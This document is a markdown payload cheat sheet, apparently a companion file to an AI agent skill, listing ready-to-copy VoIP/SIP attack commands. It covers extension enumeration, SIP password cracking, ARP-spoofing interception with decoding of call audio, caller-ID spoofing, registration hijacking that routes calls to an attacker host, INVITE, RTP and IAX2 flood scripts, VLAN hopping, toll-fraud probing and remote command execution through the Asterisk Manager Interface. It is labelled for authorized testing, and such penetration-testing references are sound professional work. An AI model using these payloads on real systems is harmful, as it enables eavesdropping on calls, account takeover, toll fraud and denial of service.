# VoIP/SIP Attack Payloads

> This file is a companion to `SKILL.md`, organizing common payloads for VoIP/SIP attack testing by attack type.
> Purpose: Quickly find commands for specific VoIP attack scenarios, ready to copy for testing.
> All payloads are for authorized security testing only.

---

## Index

1. [SIP Device Reconnaissance](#1-sip-device-reconnaissance)
2. [SIP Extension Enumeration](#2-sip-extension-enumeration)
3. [SIP Password Cracking](#3-sip-password-cracking)
4. [VoIP Eavesdropping](#4-voip-eavesdropping)
5. [VoIP Spoofing and Call Manipulation](#5-voip-spoofing-and-call-manipulation)
6. [VoIP DoS - SIP Flood](#6-voip-dos---sip-flood)
7. [VoIP DoS - RTP Flood](#7-voip-dos---rtp-flood)
8. [VoIP DoS - IAX2 Flood](#8-voip-dos---iax2-flood)
9. [VLAN Hopping into VoIP Networks](#9-vlan-hopping-into-voip-networks)

---

## 1. SIP Device Reconnaissance

### Scan Network Range for SIP Devices (svmap)

```bash
# Scan entire subnet for SIP devices
svmap 10.0.0.0/24

# Scan with custom source port
svmap -p 5060 192.168.1.0/24

# Scan specific IP range
svmap 10.0.1.100-10.0.1.200

# Scan with verbose output for fingerprinting
svmap --verbose 10.0.0.0/24
```

### Probe SIP Service with sipsak

```bash
# Send OPTIONS request to identify SIP server
sipsak -s sip:100@target.lab

# Query server capabilities
sipsak -s sip:100@10.0.0.1 -C

# Trace SIP path (like traceroute for SIP)
sipsak -T -s sip:100@target.lab

# Send NOTIFY request
sipsak -M NOTIFY -s sip:100@target.lab

# Determine server type from response headers
sipsak -s sip:target.lab -H 10.0.0.1
```

### Port Scanning for VoIP Services

```bash
# Scan common VoIP ports via nmap (UDP)
nmap -sU -p 5060,5061,4569,10000-20000 10.0.0.1

# Scan with version detection
nmap -sU -sV -p 5060 10.0.0.0/24

# Aggressive SIP script scan
nmap -sU -p 5060 --script=sip-enum-users,sip-methods 10.0.0.1
```

---

## 2. SIP Extension Enumeration

### Enumerate Extensions with svwar

```bash
# Enumerate extensions in default range
svwar -e 100-999 10.0.0.1

# Enumerate with OPTIONS method (stealthier)
svwar -m OPTIONS -e 100-9999 10.0.0.1

# Enumerate with specific domain
svwar -e 100-999 -d target.lab 10.0.0.1

# Enumerate with rate limiting to avoid detection
svwar -e 100-999 -r 1 10.0.0.1

# Enumerate using REGISTER method
svwar -m REGISTER -e 1000-1999 10.0.0.1

# Enumerate with custom source port and timeout
svwar -e 100-999 -p 5080 -t 3 10.0.0.1
```

### Manual Extension Probing with sipsak

```bash
# Probe specific extension
sipsak -s sip:100@target.lab -H 10.0.0.1

# Check if extension requires authentication
sipsak -I -s sip:200@target.lab

# Enumerate by iterating extensions manually
for ext in $(seq 100 200); do
  echo "Testing extension $ext"
  sipsak -s sip:${ext}@target.lab 2>&1 | grep -E "401|200|403|404"
done
```

---

## 3. SIP Password Cracking

### Dictionary Attack with svcrack

```bash
# Crack password for specific extension
svcrack -u 100 -d /usr/share/wordlists/rockyou.txt 10.0.0.1

# Crack with custom domain
svcrack -u 100 -d wordlist.txt -D target.lab 10.0.0.1

# Crack with rate limiting
svcrack -u 100 -d wordlist.txt -r 2 10.0.0.1

# Crack using specific source port
svcrack -u 100 -d wordlist.txt -p 5080 10.0.0.1

# Crack multiple extensions sequentially
for ext in 100 101 102 200 300; do
  echo "Cracking extension $ext"
  svcrack -u $ext -d wordlist.txt 10.0.0.1
done
```

### Test Default Credentials

```bash
# Common default credential pairs
# extension:extension, admin:admin, 100:100, 1000:1000
# Test with sipsak registration attempt
sipsak -U -s sip:100@target.lab -u 100 -a 100

# Test admin-level credentials
sipsak -U -s sip:admin@target.lab -u admin -a admin
```

---

## 4. VoIP Eavesdropping

### Capture RTP Streams

```bash
# Capture all traffic on VoIP VLAN interface
tcpdump -i eth0.100 -w voip_capture.pcap udp portrange 10000-20000

# Capture SIP signaling
tcpdump -i eth0 -w sip_signaling.pcap udp port 5060

# Capture SIP and RTP simultaneously
tcpdump -i eth0.100 -w full_voip.pcap 'udp port 5060 or udp portrange 10000-20000'

# Filter RTP traffic from specific host
tcpdump -i eth0.100 -w target_rtp.pcap host 10.0.0.5 and udp portrange 10000-20000
```

### Decode Captured Audio

```bash
# Extract audio from PCAP using Wireshark (manual)
# Edit -> Preferences -> Protocols -> RTP -> Try to decode RTP stream

# Decode RTP stream from PCAP with tshark
tshark -r voip_capture.pcap -R rtp -T fields -e rtp.payload

# Convert raw RTP payload to WAV using sox
# First extract payload, then convert
tshark -r voip_capture.pcap --rtp-stream-filter='10.0.0.5:10000-10.0.0.6:10000' \
  -T fields -e rtp.payload | \
  tr -d '\n:, ' | xxd -r -p | \
  sox -t raw -b 16 -e signed -r 8000 -c 1 - decoded_audio.wav
```

### Active RTP Interception

```bash
# ARP poison to intercept VoIP traffic (authorized testing only)
arpspoof -i eth0 -t 10.0.0.5 10.0.0.1
arpspoof -i eth0 -t 10.0.0.1 10.0.0.5

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Capture the intercepted traffic
tcpdump -i eth0 -w intercepted_voip.pcap 'host 10.0.0.5 and (udp port 5060 or udp portrange 10000-20000)'
```

---

## 5. VoIP Spoofing and Call Manipulation

### SIP Caller ID Spoofing

```bash
# Craft spoofed INVITE with sipsak
sipsak -I -s sip:200@target.lab -H 10.0.0.1 \
  --from "Spoofed <sip:999@target.lab>"

# Send spoofed MESSAGE
sipsak -M MESSAGE -s sip:200@target.lab \
  --from "Admin <sip:admin@target.lab>" \
  -B "Urgent: call this number"
```

### SIP Registration Hijacking

```bash
# Register with discovered credentials, binding to attacker IP
sipsak -U -s sip:100@target.lab \
  -u 100 -a crackedpassword \
  --from "100 <sip:100@attacker-ip>"

# De-register a target extension
sipsak -U -s sip:100@target.lab \
  -u 100 -a crackedpassword \
  -e 0
```

---

## 6. VoIP DoS - SIP Flood

### SIP INVITE Flood with inviteflood

```bash
# Flood target with SIP INVITE requests
inviteflood -i eth0 10.0.0.1 10.0.0.5 100@target.lab 10000

# Flood with source IP spoofing
inviteflood -i eth0 10.0.0.1 10.0.0.5 100@target.lab 50000 -a 10.0.0.99

# Flood targeting SIP proxy
inviteflood -i eth0 10.0.0.1 10.0.0.1 200@target.lab 100000

# Flood with custom prefix extension range
inviteflood -i eth0 10.0.0.1 10.0.0.5 ldir@target.lab 20000
```

### SIP REGISTER Flood

```bash
# Flood with rapid registration attempts using sipsak
while true; do
  sipsak -U -s sip:100@target.lab -u 100 -a "guess$RANDOM" 2>/dev/null
done
```

---

## 7. VoIP DoS - RTP Flood

### RTP Packet Flood with rtpflood

```bash
# Flood RTP port on target
rtpflood 10.0.0.5 10000 1000

# Flood with high packet count
rtpflood 10.0.0.5 10000 10000

# Flood multiple RTP ports simultaneously
for port in 10000 10002 10004 10006; do
  rtpflood 10.0.0.5 $port 5000 &
done
```

---

## 8. VoIP DoS - IAX2 Flood

### IAX2 Flood with iaxflood

```bash
# Flood Asterisk server on default IAX2 port
iaxflood 10.0.0.1 4569 1000

# Flood with higher packet count
iaxflood 10.0.0.1 4569 5000

# Flood from specific interface
iaxflood -i eth0.100 10.0.0.1 4569 2000

# Flood targeting specific IAX2 extension
iaxflood 10.0.0.1 4569 10000
```

---

## 9. VLAN Hopping into VoIP Networks

### CDP-Based VLAN Hopping with voiphopper

```bash
# Auto-detect voice VLAN via CDP
voiphopper -i eth0 -C

# Specify CDP device template
voiphopper -i eth0 -c -z 1

# Spoof CDP device identity
voiphopper -i eth0 -C -a "SEP001122334455" -m "Cisco IP Phone 7940"
```

### DHCP-Based Voice VLAN Discovery

```bash
# Discover voice VLAN via DHCP
voiphopper -i eth0 -D

# Use 802.1Q tagging on discovered VLAN
voiphopper -i eth0 -v 100

# Combined CDP + DHCP approach
voiphopper -i eth0 -C -D
```

### Manual VLAN Hopping

```bash
# Add 802.1Q tag for voice VLAN (VLAN 100)
ip link add link eth0 name eth0.100 type vlan id 100
ip link set eth0.100 up
dhclient eth0.100

# Scan VoIP VLAN for SIP devices
svmap -i eth0.100 10.0.100.0/24

# Capture CDP packets to identify voice VLAN
tcpdump -i eth0 -nn -vve ether dst 01:00:0c:cc:cc:cc
```

---

## 10. SIP Server Fingerprinting and Enumeration

### SIP Server Type Identification

```bash
# Identify SIP server type from OPTIONS response headers
sipsak -s sip:100@10.0.0.1 -C 2>&1 | grep -iE "Server:|User-Agent:|Allow:"

# Fingerprint Asterisk PBX
sipsak -s sip:100@10.0.0.1 2>&1 | grep -i "asterisk"

# Fingerprint FreeSWITCH
sipsak -s sip:100@10.0.0.1 2>&1 | grep -i "freeswitch"

# Fingerprint Kamailio/OpenSER proxy
sipsak -s sip:100@10.0.0.1 2>&1 | grep -i "kamailio\|openser"

# Enumerate supported SIP methods
sipsak -s sip:100@10.0.0.1 -C 2>&1 | grep "Allow:"
```

### SIP Domain and Realm Discovery

```bash
# Extract SIP realm from 401/407 authentication challenge
sipsak -U -s sip:100@10.0.0.1 -u test -a test 2>&1 | grep -i "realm\|nonce"

# Enumerate SIP domains hosted on the server
for domain in target.lab sip.target.lab voip.target.lab; do
  echo "Testing domain: $domain"
  sipsak -s sip:100@$domain -H 10.0.0.1 2>&1 | grep -E "200|401|403|404"
done

# Extract server capabilities via REGISTER
sipsak -U -s sip:100@10.0.0.1 -u 100 -a test 2>&1 | head -20
```

---

## 11. Advanced VoIP Call Interception

### SIP INVITE Manipulation and Man-in-the-Middle

```bash
# Monitor SIP registration to identify active call setup
tcpdump -i eth0.100 -w sip_monitor.pcap udp port 5060

# Extract SIP INVITE messages to identify call participants
tshark -r sip_monitor.pcap -Y "sip.Method==INVITE" -T fields -e sip.from -e sip.to -e ip.src

# Intercept and modify SIP SDP to redirect RTP stream
# Use Bettercap for active MITM on VoIP VLAN
sudo bettercap -eval "
  set arp.spoof.targets 10.0.0.5,10.0.0.1
  arp.spoof on
  net.sniff on
"

# Extract RTP media sessions from intercepted traffic
tshark -r sip_monitor.pcap -Y "rtp" -T fields -e rtp.ssrc -e ip.src -e ip.dst -e udp.srcport -e udp.dstport | sort -u
```

### VoIP Packet Decoding and Analysis

```bash
# Decode G.711 (PCMU/PCMA) RTP audio from capture
tshark -r voip_capture.pcap --rtp-stream \
  -T fields -e rtp.payload 2>/dev/null | \
  tr -d '\n:, ' | xxd -r -p | \
  sox -t raw -b 16 -e signed-integer -r 8000 -c 1 - decoded_g711.wav

# Decode G.722 wideband codec RTP audio
tshark -r voip_capture.pcap -Y "rtp.payload" \
  -T fields -e rtp.payload 2>/dev/null | \
  tr -d '\n:, ' | xxd -r -p > /tmp/g722_raw
sox -t g722 /tmp/g722_raw decoded_g722.wav

# Identify codec in use from SIP SDP exchange
tshark -r voip_capture.pcap -Y "sdp" -T fields -e sdp.media_type -e sdp.format

# Calculate MOS (Mean Opinion Score) from RTP statistics
tshark -r voip_capture.pcap -Y "rtp" -T fields -e rtp.stats
tshark -r voip_capture.pcap -z "rtp,streams"
```

---

## 12. VoIP Infrastructure Testing

### Asterisk Manager Interface (AMI) Testing

```bash
# Test default AMI credentials (default: admin/secret or manager/secret)
echo -e "Action: Login\nUsername: admin\nSecret: secret\nEvents: off\n\nAction: Command\nCommand: sip show peers\n\nAction: Logoff\n\n" | nc 10.0.0.1 5038

# Test for AMI exposure on non-standard ports
nmap -sT -p 5038,8088,8443 10.0.0.1

# Enumerate SIP peers via AMI
echo -e "Action: Login\nUsername: admin\nSecret: secret\nEvents: off\n\nAction: Command\nCommand: sip show peers\n\nAction: Logoff\n\n" | nc 10.0.0.1 5038 | grep -E "^[0-9]"

# Execute system command via AMI (if Originate is allowed)
echo -e "Action: Login\nUsername: admin\nSecret: secret\nEvents: off\n\nAction: Originate\nChannel: Local/1@default\nApplication: System\nData: id > /tmp/ami_output\n\nAction: Logoff\n\n" | nc 10.0.0.1 5038
```

### SIP TLS and SRTP Testing

```bash
# Scan for SIP over TLS (port 5061)
nmap -sT -p 5061 --script ssl-enum-ciphers 10.0.0.1

# Test SIP over TLS with sipsak
sipsak -s sips:100@10.0.0.1 -C

# Check if SRTP is enforced (analyze SDP for crypto attributes)
tshark -r voip_capture.pcap -Y "sdp" -T fields -e sdp.attr

# Test for TLS downgrade vulnerability
sipsak -s sip:100@10.0.0.1:5061 -C 2>&1 | grep -i "transport"
```

### VoIP Gateway and Trunk Testing

```bash
# Identify SIP trunks between PBX and PSTN gateway
sipsak -s sip:100@10.0.0.1 -C 2>&1 | grep -iE "gateway|trunk|pstn"

# Test toll fraud by attempting outbound call via discovered trunk
sipsak -I -s sip:900@10.0.0.1 -H 10.0.0.1 \
  --from "Attacker <sip:900@10.0.0.1>"

# Enumerate dialable numbers via INVITE without authentication
for num in 900 911 00 01144 18005551234; do
  echo "Testing number: $num"
  sipsak -I -s sip:${num}@10.0.0.1 -H 10.0.0.1 2>&1 | grep -E "200|401|403|404|407"
done
```

---

## 13. VoIP Scan Automation and Reporting

### Comprehensive VoIP Assessment Script

```bash
#!/bin/bash
# VoIP assessment automation script
TARGET="10.0.0.1"
IFACE="eth0.100"
REPORT="/tmp/voip_assessment_$(date +%Y%m%d_%H%M%S).txt"

echo "=== VoIP Assessment Report ===" > "$REPORT"
echo "Target: $TARGET" >> "$REPORT"
echo "Date: $(date -Iseconds)" >> "$REPORT"
echo "" >> "$REPORT"

echo "[1] SIP Device Discovery" >> "$REPORT"
svmap $TARGET >> "$REPORT" 2>&1
echo "" >> "$REPORT"

echo "[2] Extension Enumeration (100-999)" >> "$REPORT"
svwar -e 100-999 $TARGET >> "$REPORT" 2>&1
echo "" >> "$REPORT"

echo "[3] SIP Fingerprinting" >> "$REPORT"
sipsak -s sip:100@$TARGET -C >> "$REPORT" 2>&1
echo "" >> "$REPORT"

echo "[4] Default Credential Testing" >> "$REPORT"
for ext in 100 200 300 admin; do
  sipsak -U -s sip:${ext}@$TARGET -u $ext -a $ext 2>&1 | grep -E "200|401" >> "$REPORT"
done
echo "" >> "$REPORT"

echo "[5] Port Scan" >> "$REPORT"
nmap -sU -p 5060,5061,4569,10000-10100 $TARGET >> "$REPORT" 2>&1
echo "" >> "$REPORT"

echo "[6] VoIP Traffic Capture (30s)" >> "$REPORT"
timeout 30 tcpdump -i $IFACE -w /tmp/voip_auto_capture.pcap 'udp port 5060 or udp portrange 10000-20000' 2>/dev/null
echo "Capture saved: /tmp/voip_auto_capture.pcap" >> "$REPORT"

echo "[ASSESSMENT COMPLETE] Report: $REPORT"
```

---

## 14. SIP Authentication Bypass and Advanced Attacks

### SIP Authentication Digest Cracking

```bash
# Capture SIP 401/407 challenge-response exchange
tcpdump -i eth0.100 -w sip_auth.pcap udp port 5060

# Extract authentication details from SIP challenge
tshark -r sip_auth.pcap -Y "sip.Status-Code==401 || sip.Status-Code==407" \
  -T fields -e sip.Authentication-Info -e wwwauth

# Use sipcrack to crack SIP digest authentication
# First extract challenges: sipdump -i eth0.100 -p sip_auth.dump
sipdump -i eth0.100 -p sip_auth.dump

# Crack captured SIP authentication
sipcrack -w /usr/share/wordlists/rockyou.txt sip_auth.dump
```

### SIP Registration Hijacking via Password Recovery

```bash
# De-register all existing bindings for an extension
sipsak -U -s sip:100@10.0.0.1 -u 100 -a crackedpass -e 0

# Re-register with attacker binding
sipsak -U -s sip:100@10.0.0.1 -u 100 -a crackedpass \
  --from "100 <sip:100@ATTACKER_IP>"

# Verify calls are now routed to attacker
sipsak -I -s sip:200@10.0.0.1 -H 10.0.0.1 \
  --from "200 <sip:200@10.0.0.1>"
```

### Voicemail and Conference Bridge Testing

```bash
# Test voicemail access with default PINs
for pin in 0000 1234 1111 1000 9999 12345 00000; do
  echo "Testing voicemail PIN: $pin"
  sipsak -I -s sip:*97@10.0.0.1 -H 10.0.0.1 -B "$pin" 2>&1 | grep -E "200|401|403"
done

# Test conference bridge access
sipsak -I -s sip:9000@10.0.0.1 -H 10.0.0.1
sipsak -I -s sip:9001@10.0.0.1 -H 10.0.0.1

# Test intercom/paging features
sipsak -I -s sip:page@10.0.0.1 -H 10.0.0.1
sipsak -I -s sip:intercom@10.0.0.1 -H 10.0.0.1
```

---

## 15. SIP INVITE Flooding with Custom Scripts

### Python SIP INVITE Flood Script

```python
#!/usr/bin/env python3
# Custom SIP INVITE flood for authorized load testing
import socket
import random
import sys

TARGET_IP = sys.argv[1]
TARGET_PORT = 5060
COUNT = int(sys.argv[2]) if len(sys.argv) > 2 else 100

for i in range(COUNT):
    branch = f"z9hG4bK{random.randbytes(8).hex()}"
    caller = f"{random.randint(100,999)}"
    invite = (
        f"INVITE sip:{caller}@{TARGET_IP} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP 10.0.0.99:5060;branch={branch}\r\n"
        f"From: <sip:attacker@10.0.0.99>;tag={random.randbytes(4).hex()}\r\n"
        f"To: <sip:{caller}@{TARGET_IP}>\r\n"
        f"Call-ID: {random.randbytes(8).hex()}@10.0.0.99\r\n"
        f"CSeq: 1 INVITE\r\n"
        f"Contact: <sip:attacker@10.0.0.99>\r\n"
        f"Content-Length: 0\r\n\r\n"
    )
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(invite.encode(), (TARGET_IP, TARGET_PORT))
    sock.close()
print(f"Sent {COUNT} INVITE requests to {TARGET_IP}")
```

### RTP Stream Analysis and Decoding

```bash
# Analyze RTP stream statistics from capture
tshark -r voip_capture.pcap -z "rtp,streams"

# Extract RTP payload type to identify codec in use
tshark -r voip_capture.pcap -Y "rtp" -T fields -e rtp.p_type | sort | uniq -c | sort -rn

# Calculate packet loss from RTP sequence numbers
tshark -r voip_capture.pcap -Y "rtp" -T fields -e rtp.seq -e ip.src | sort | uniq -c
```

### SIP OPTIONS Keepalive Flood

```bash
# Flood with OPTIONS requests to exhaust server connection table
for i in $(seq 1 5000); do
  sipsak -s sip:100@10.0.0.1 -C 2>/dev/null &
done
wait
```

### VoIP Credential Harvesting with SIPp

```bash
# SIPp registration brute force with CSV credentials
# Create credential CSV
echo -e "SEQUENTIAL\n100,password1\n100,password2\n100,password3" > creds.csv

# Run SIPp with registration scenario
sipp 10.0.0.1:5060 -sf register.xml -inf creds.csv -m 3 -l 1
```

### SIP Cancel and Bye Flood

```bash
# Send CANCEL requests to tear down active calls
for i in $(seq 1 100); do
  sipsak -I -s sip:100@10.0.0.1 -H 10.0.0.1 &
  sleep 0.1
  sipsak -M CANCEL -s sip:100@10.0.0.1 -H 10.0.0.1 2>/dev/null
done

# Send BYE to tear down established sessions
sipsak -M BYE -s sip:100@10.0.0.1 -H 10.0.0.1 \
  --from "200 <sip:200@10.0.0.1>" 2>/dev/null
```

### VoIP Scanner Integration with Nmap NSE

```bash
# Comprehensive VoIP Nmap scan with all SIP scripts
nmap -sU -p 5060 --script=sip-enum-users,sip-methods,sip-brute 10.0.0.0/24

# SIP brute force with Nmap
nmap -sU -p 5060 --script=sip-brute --script-args userdb=users.txt,passdb=passwords.txt 10.0.0.1

# Enumerate SIP methods supported by the server
nmap -sU -p 5060 --script=sip-methods 10.0.0.1
```

### SIP Redirect and Proxy Abuse

```bash
# Test for open SIP proxy (relay calls through target)
sipsak -I -s sip:external_number@external-carrier.com -H 10.0.0.1 \
  --from "Attacker <sip:attacker@10.0.0.99>"

# Test for SIP redirect vulnerability
sipsak -I -s sip:100@10.0.0.1 -H 10.0.0.1 \
  --from "100 <sip:100@evil.attacker.com>"

# Enumerate SIP proxy capabilities
sipsak -s sip:10.0.0.1 -C 2>&1 | grep -iE "Allow:|Accept:|Supported:|Require:"
```

### VoIP Network Mapping

```bash
# Map VoIP network topology via SIP Via headers
tshark -r voip_capture.pcap -Y "sip" -T fields -e sip.Via | tr ',' '\n' | sort -u

# Identify internal network ranges from SIP headers
tshark -r voip_capture.pcap -Y "sip" -T fields -e sip.Contact | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort -u

# Extract SIP user agents for fingerprinting
tshark -r voip_capture.pcap -Y "sip" -T fields -e sip.User-Agent | sort | uniq -c | sort -rn
```

---

## 16. VoIP Security Assessment Automation

### Automated VoIP Reconnaissance Script

```bash
#!/bin/bash
# Automated VoIP security assessment - authorized testing only
TARGET="$1"
REPORT="/tmp/voip_recon_$(date +%Y%m%d_%H%M%S).txt"

echo "[1] SIP Service Detection" | tee "$REPORT"
nmap -sU -p 5060,5061 -sV "$TARGET" | tee -a "$REPORT"

echo "[2] SIP Device Enumeration" | tee -a "$REPORT"
svmap "$TARGET" | tee -a "$REPORT"

echo "[3] Extension Enumeration (100-999)" | tee -a "$REPORT"
svwar -e 100-999 "$TARGET" | tee -a "$REPORT"

echo "[4] SIP Server Fingerprinting" | tee -a "$REPORT"
sipsak -s sip:100@"$TARGET" -C 2>&1 | tee -a "$REPORT"

echo "[5] Default Credential Testing" | tee -a "$REPORT"
for ext in 100 admin operator; do
  sipsak -U -s sip:${ext}@"$TARGET" -u "$ext" -a "$ext" 2>&1 | grep -E "200|401" | tee -a "$REPORT"
done

echo "Report saved to: $REPORT"
```

### RTP Injection and Manipulation

```bash
# Inject RTP packets to manipulate audio stream
# Requires rtpbreak or custom tool
rtpbreak -d /tmp/rtp_output -i eth0.100

# Capture and replay RTP packets with scapy
python3 -c "
from scapy.all import *
packets = rdpcap('voip_capture.pcap')
rtp_packets = [p for p in packets if UDP in p and p[UDP].dport > 10000]
sendp(rtp_packets[:10], iface='eth0.100')
"
```

### SIP TLS Certificate Analysis

```bash
# Check SIP TLS certificate details
openssl s_client -connect 10.0.0.1:5061 -servername sip.target.lab </dev/null 2>/dev/null | openssl x509 -noout -text

# Check for expired or self-signed certificates
echo | timeout 5 openssl s_client -connect 10.0.0.1:5061 2>/dev/null | openssl x509 -noout -dates -subject -issuer

# Test for TLS downgrade vulnerability
sipsak -s sip:100@10.0.0.1:5061 -C 2>&1 | grep -i "transport\|tls\|ssl"
```

### VoIP QoS and Performance Testing

```bash
# Measure SIP response time
time sipsak -s sip:100@10.0.0.1 -C 2>&1 | tail -1

# Measure RTP jitter and packet loss from capture
tshark -r voip_capture.pcap -z "rtp,streams" 2>/dev/null

# Calculate average SIP response time across multiple requests
for i in $(seq 1 20); do
  sipsak -s sip:100@10.0.0.1 -C 2>&1 | grep -oE '[0-9]+ ms'
done | awk '{sum+=$1; count++} END {print "Avg response: " sum/count " ms"}'
```

---

## 17. VoIP Credential Testing Automation

### SIP Registration Brute Force with Medusa

```bash
# Medusa SIP authentication brute force
medusa -h 10.0.0.1 -u admin -P passwords.txt -M sip -m DIR:/ -T 2
```

### VoIP Traffic Statistics

```bash
# Generate VoIP traffic statistics report
tshark -r voip_capture.pcap -z "io,stat,1" 2>/dev/null | grep -E "tcp|udp"
tshark -r voip_capture.pcap -z conv,udp 2>/dev/null
```

### SIP User Agent Fingerprinting Database

```bash
# Build SIP user-agent fingerprint database
tshark -r voip_capture.pcap -Y "sip" -T fields -e sip.User-Agent -e ip.src | sort -u | while read ua ip; do
  echo "$ip|$ua"
done | tee voip_fingerprints.txt

# Cross-reference user-agents with known vulnerabilities
grep -iE "asterisk|freeswitch|kamailio|opensips|linphone|zoiper" voip_fingerprints.txt | while read line; do
  ip=$(echo "$line" | cut -d'|' -f1)
  ua=$(echo "$line" | cut -d'|' -f2)
  echo "Searching exploits for: $ua at $ip"
  searchsploit "$ua" 2>/dev/null | head -5
done
```

---

## 18. VoIP Cloud and SIP Trunk Testing

### SIP Trunk Security Testing

```bash
# Test SIP trunk for toll fraud by attempting outbound calls
for dest in 900 911 001 011 1900; do
  sipsak -I -s sip:${dest}@10.0.0.1 -H 10.0.0.1 2>&1 | grep -E "200|403|401"
done

# Enumerate SIP trunk allowed codecs
sipsak -I -s sip:+1234567890@sip-provider.com -H 10.0.0.1 2>&1 | grep -i "rtpmap\|codec"
```

### Cloud VoIP Service Enumeration

```bash
# Enumerate cloud-hosted VoIP services
nmap -sT -p 5060,5061,8089,8443 --script http-title 10.0.0.0/24

# Test for WebRTC gateway exposure
curl -s "http://10.0.0.1:8089/ws" --include -H "Upgrade: websocket" -H "Connection: Upgrade" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" -H "Sec-WebSocket-Version: 13"
```

### VoIP Network Segmentation Testing

```bash
# Test if VoIP VLAN is accessible from data VLAN
nmap -sT -p 5060 -n 10.0.100.0/24 --spoof-mac aa:bb:cc:dd:ee:ff -e eth0
```

### VoIP Call Recording Detection

```bash
# Detect potential call recording by monitoring for RTP duplication
tshark -r voip_capture.pcap -Y "rtp" -T fields -e rtp.ssrc -e ip.src -e ip.dst | sort | uniq -c | sort -rn | head -10
```

### SIP Response Code Analysis

```bash
# Analyze SIP response codes for security insights
tshark -r voip_capture.pcap -Y "sip.Status-Code" -T fields -e sip.Status-Code | sort | uniq -c | sort -rn
```
